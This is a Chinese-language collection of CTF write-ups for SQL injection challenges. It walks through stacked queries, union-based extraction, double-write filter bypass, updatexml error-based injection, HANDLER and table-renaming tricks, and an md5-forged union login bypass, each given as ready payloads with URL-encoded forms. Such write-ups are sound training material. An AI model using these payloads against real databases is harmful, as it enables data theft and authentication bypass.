# [SUCTF 2019]EasySQL 1

1. 试试SQL注入的正常套路
- 先试试1,有回显Array ( [0] => 1 )
- 再试试字母aaa,没有回显
- 试试单引号注入1' or '1'='1,提示不一样，因此猜测这里有注入点
- 试试有多少列1' order by 4#,还是不成功，因此一般的联合查询在这里不能使用
- 基于时间的盲注和报错注入都需要嵌套联合查询语句来实现，因此可以跳过，直接试试布尔型盲注1' and length(database())>=1,还是不成功
2. 利用堆叠注入
- 查找所有数据库1;show databases#
- 查找所有表名1;show tables#
- 查询Flag表中的列1;show columns from Flag#
- 不成功
3. 输入字符的时候啥也不回显。
   有经验的师傅这个时候其实就懂得要放弃布尔盲注、时间盲注了。
   这种格式很明显是要你搞后端代码，他到底怎么写的呢？
   那就很有趣了。
   其实你应该推断出一个基本事实：
   他的后端既然能做到数字回显字母不回显，说明有一个 或 结构，而且不直接回显flag，但作为一道题目，from一定是from flag。
4. 猜测select $_POST['query'] || flag from flag
5. 拼接select *,1 from flag

# [强网杯 2019]随便注 1(堆叠注入)

1. 用union联合查询

第一步、尝试测试注入点（一些小tips：利用引号，and 1=1， or 1=1之类的）判断是字符型还是数字型

1' 报错

1'# 不报错，正常回显

1' and 1=1# 不报错，正常回显

1' or 1=1# 不报错，正常回显

说明存在SQL注入

第二步、尝试用order by语句查询表的列数

1' order by 1;#不报错，正常回显

1' order by 2;#不报错，正常回显

1' order by 3;#报错

说明这张表有三列

第三步、尝试用union select 找到回显位

发现回显过滤了关键字

2. 不能找到回显位，尝试使用堆叠注入。

第一步、通过"1';show databases;#"爆出数据库

第二步、通过"1';show tables;#"爆出表名

第三步、看到此处有两个表，通过"1';show columns from `words`;#",先爆出"words"中的内容。然后通过"1';show columns from `1919810931114514`;#"爆出"1919810931114514"的内容。

3. 在"1919810931114514"中发现flag所在的字段。但select函数已被过滤，下面尝试用三种方法用来做select函数被过滤的题型。

>第一种：hander语句代替select语句。　

语法结构：

　　　　HANDLER tbl_name OPEN [ [AS] alias]

　　　　HANDLER tbl_name READ index_name { = | <= | >= | < | > } (value1,value2,...)

　　　　[ WHERE where_condition ] [LIMIT ... ]

　　　　HANDLER tbl_name READ index_name { FIRST | NEXT | PREV | LAST }

　　　　[ WHERE where_condition ] [LIMIT ... ]

　　　　HANDLER tbl_name READ { FIRST | NEXT }

　　　　[ WHERE where_condition ] [LIMIT ... ]

　　　　HANDLER tbl_name CLOSE

解释：通过handler语句查询users表的内容

　　　　handler users open as yunensec; #指定数据表进行载入并将返回句柄重命名

　　　　handler yunensec read first; #读取指定表/句柄的首行数据

　　　　handler yunensec read next; #读取指定表/句柄的下一行数据

　　　　handler yunensec read next; #读取指定表/句柄的下一行数据

　　　　...

　　　　handler yunensec close; #关闭句柄

Payload: 1';handler `1919810931114514` open as `kay`;handler `kay` read next;#

得到flag.

>第二种：更改表明列名

虽然正则过滤过滤了很多函数，但没过滤alert和rename等关键字。

我们如果将表1919810931114514名字改为words，flag列名字改为id，那么我们就能得到flag的内容了！

更改表明列名的语法

-- 修改表名

　　　　rename table old_table to new_table;

　　　　-- 或者

　　　　alter table old_table rename to new_table;

　　　　-- 修改列名称

　　　　alter table table_name change column old_name new_name varchar(255);

　　　　-- 修改字段类型

　　　　alter table table_name modify column column_name varchar(255) default '' COMMENT '注释';



Payload："1';rename table `words` to `words1`;rename table `1919810931114514` to `words`;alter table `words` change flag id varchar(100);"

拆分开来如下

　　　　1';

　　　　rename table `words` to words1;

　　　　renmae table `1919810931114514` to `words`;

　　　　alter table words change flag id varchar(100);

然后使用"1' or 1=1;#"即可查出flag.

>第三种，尝试使用SQL预编译的方式

# [极客大挑战 2019]LoveSQL 1

1. ?username=1' order by 4%23&password=ads   报错了,说明有三个字段

2. ?username=1' union select 1,2,3%23&password=ads

   寻找注入点
   
   ![](https://s21.ax1x.com/2024/04/06/pFq0v0P.png)
3. 2和3都是注入点，而且没有过滤
4. ?username=1' union select 1,database(),3%23&password=ads,得到数据库名geek
5. ?username=1' union select 1,database(),group_concat(table_name) from information_schema.tables where table_schema=database()%23&password=ads

   得到geekuser,l0ve1ysq1表
6. ?username=1' union select 1,database(),group_concat(column_name) from information_schema.columns where table_name='l0ve1ysq1'%23&password=ads

   得到字段名id,username,password
7. ?username=1' union select 1,database(),group_concat(id,username,password) from l0ve1ysq1%23&password=ads

   得到flag

# [极客大挑战 2019]BabySQL 1(双写绕过)

1. 直接尝试万能密码1' or '1'='1    1' or '1'='1
2. 直接进行sql注入

   尝试1’ order by 3# 发现order中的or被过滤，同时by也被过滤

   因此直接尝试联合注入

   Payload:

   username=1’union select 1#&password=1

   Url:

   username=1%27union%20select%201%23&password=1
3. 可以发现这里union select都被过滤了，因此尝试双写绕过

   Payload:

   username=1’ununionion seselectlect 1#&password=1

   url:

   username=1%27ununionion%20seselectlect%201%23&password=1
4. 发现有回显，显示列数不同，因此双写绕过是可行的

   继续试列数

   Payload：

   username=1’ununionion seselectlect 1,2,3#&password=1

   Url:

   username=1%27ununionion%20seselectlect%201,2,3%23&password=1
5. 有回显，找到正确列数三列

   接下来查询数据库

   Payload:

   username=1’ununionion seselectlect 1,version(),database()#&password=1

   Url:

   username=1%27ununionion%20seselectlect%201,version(),database()%23&password=1
6. 成功显示数据库，接着查询表名

   Payload:

   username=1’ununionion seselectlect 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()#&password=1

   Url:

   username=1%27ununionion%20seselectlect%201,2,group_concat(table_name)%20from%20information_schema.tables%20where%20table_schema=database()%23&password=1
7. 可看出information,from被过滤

   因此继续双写绕过

   Payload:

   username=1’ununionion seselectlect 1,2,group_concat(schema_name) frfromom infoorrmation_schema.schemata#&password=1

   Url:

   username=1%27ununionion%20seselectlect%201,2,group_concat(schema_name)%20frfromom%20infoorrmation_schema.schemata%23&password=1
8. 可看出所有的数据库information_schema,mysql,performance_schema,test,ctf,geek

   查询表名（继续使用联合查询）需要双写的有information，from，where

   Payload:

   username=1’ ununionion seselectlect 1,2,group_concat(table_name) frfromom infoorrmation_schema.tables whwhereere table_schema=’geek’#&password=1

   Url:

   username=1%27%20ununionion%20seselectlect%201,2,group_concat(table_name)%20frfromom%20infoorrmation_schema.tables%20whwhereere%20table_schema=%27geek%27%23&password=1
9. 得到geek数据库里的表b4bsql,geekuser，发现flag不在此数据库中

   因此直接试ctf的表

   Payload:

   username=1’ ununionion seselectlect 1,2,group_concat(table_name) frfromom infoorrmation_schema.tables whwhereere table_schema=’ctf’#&password=1

   Url:

   username=1%27%20ununionion%20seselectlect%201,2,group_concat(table_name)%20frfromom%20infoorrmation_schema.tables%20whwhereere%20table_schema=%27ctf%27%23&password=1
10. 发现ctf数据库中存在Flag表

    查询表中的字段名

    Payload:

    username=1’ ununionion seselectlect 1,2,group_concat(column_name) frfromom infoorrmation_schema.columns whwhereere table_schema=’ctf’#&password=1

    Url:

    username=1%27%20ununionion%20seselectlect%201,2,group_concat(column_name)%20frfromom%20infoorrmation_schema.columns%20whwhereere%20table_schema=%27ctf%27%23&password=1
11. 接着查询flag中内容

    Payload:

    username=1’ ununionion seselectlect 1,2,group_concat(flag) frfromom ctf.Flag#&password=1

    Url:

    username=1%27%20ununionion%20seselectlect%201,2,group_concat(flag)%20frfromom%20ctf.Flag%23&password=1

# [极客大挑战 2019]HardSQL 1(报错注入)

1. 尝试输入数字或字母，尝试万能密码不行，同时发现双写也被过滤掉了,同时空格，=，union也被过滤了
2. 尝试报错注入

   报错注入有两个函数，这里我们使用updatexml(a,b,c)，此函数a，c必须为String类型，因此可以使a,c不为String型进行报错

   Payload:

   username=1’or(updatexml(1,concat(0x7e,database(),0x7e),1))#&password=1

   Url:

   username=1%27or(updatexml(1,concat(0x7e,database(),0x7e),1))%23&password=1
3. 显示数据库geek

   接下来查找表

   Payload:

   username=1’or(updatexml(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema)like(database()))),0x7e),1))#&password=1

   Url:

   username=1%27or(updatexml(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema)like(database())),0x7e),1))%23&password=1
4. 得到H4rDsq1

   接下来查字段

   Payload:

   username=1’or(updatexml(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_schema)like(database()))),0x7e),1))#&password=1

   Url:

   username=1%27or(updatexml(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_schema)like(database())),0x7e),1))%23&password=1
5. 得到id,username,password

   继续查询值

   Payload:

   username=1’or(updatexml(1,concat(0x7e,(select(group_concat(id,username,password))from(H4rDsq1)),0x7e),1))#&password=1

   Url：

   username=1%27or(updatexml(1,concat(0x7e,(select(group_concat(id,username,password))from(H4rDsq1)),0x7e),1))%23&password=1
6. 发现flag并没有完全显示

   使用right()查询后面部分

   Payload:

   username=1’or(updatexml(1,concat(0x7e,(select(group_concat((right(password,25))))from(H4rDsq1)),0x7e),1))#&password=1

   Url:

   username=1%27or(updatexml(1,concat(0x7e,(select(group_concat((right(password,25))))from(H4rDsq1)),0x7e),1))%23&password=1
7. 拼接得到flag

# [GXYCTF2019]BabySQli 1

1. 打开burp，随便输入进行抓包
2. 得到一串编码`MMZFM422K5HDASKDN5TVU3SKOZRFGQRRMMZFM6KJJBSG6WSYJJWESSCWPJNFQSTVLFLTC3CJIQYGOSTZKJ2VSVZRNRFHOPJ5` 
3. 通过测试发现是套加密(二次加密),首先使用base32对此解码,然后用base64解码
4. 得到一串SQL查询语句`select * from user where username = '$name'`.通过对这段SQL语句的初步判断,可以得出此题的注入点是参数name
5. `name=1'&pw=123`发现有SQL报错,可以得出此题的注入类型为字符型注入
6. `name=1' or '1'='1'#&pw=123`尝试万能密码,得到do not hack me!,猜测’or’关键字或’='字符被过滤
>判断字段数

`name=1'union select 1,2,3#&pw=123`

>判断用户所在列

`name=1'union select 1,'admin',3#&pw=123`通过用户所在列测试,得出了存在用户admin,又得出了admin用户在第二列,也就是username字段那一列.

>查看题目源码,在search.php源代码哪里发现关键代码

```php
if($arr[1] == "admin"){
			if(md5($password) == $arr[2]){
				echo $flag;
			}
			else{
				die("wrong pass!");
			}
		}
```

发现参数password被md5加密,大致就是传进去的值要进行md5值加密

换种方式猜测

username数据表里面的3个字段分别是flag、name、password

猜测只有password字段位NULL

咱们给参数password传入的值是123

那么传进去后，后台就会把123进行md5值加密并存放到password字段当中

当我们使用查询语句的时候

我们pw参数的值会被md5值进行加密

然后再去与之前存入password中的md5值进行比较

如果相同就会输出flag

>爆flag

这里pw参数的值为123456,可以随便传,但是要对传入的那个值进行md5值加密,网上可以随便找一个在线md5加密平台

`name=1'union select 1,'admin','e10adc3949ba59abbe56e057f20f883e'#&pw=123456`,得到flag

# [GYCTF2020]Blacklist 1(Handler)

1. 尝试堆叠注入,`1';show tables;#`
2. 1';show columns from `FlagHere`;#,发现有flag字段
3. 1‘;select flag from `FlagHere`;#,发现select被过滤
4. 1';handler `FlagHere` open as `kay`;handler `kay` read next;#
5. Handler方法在上面的wp中有提及






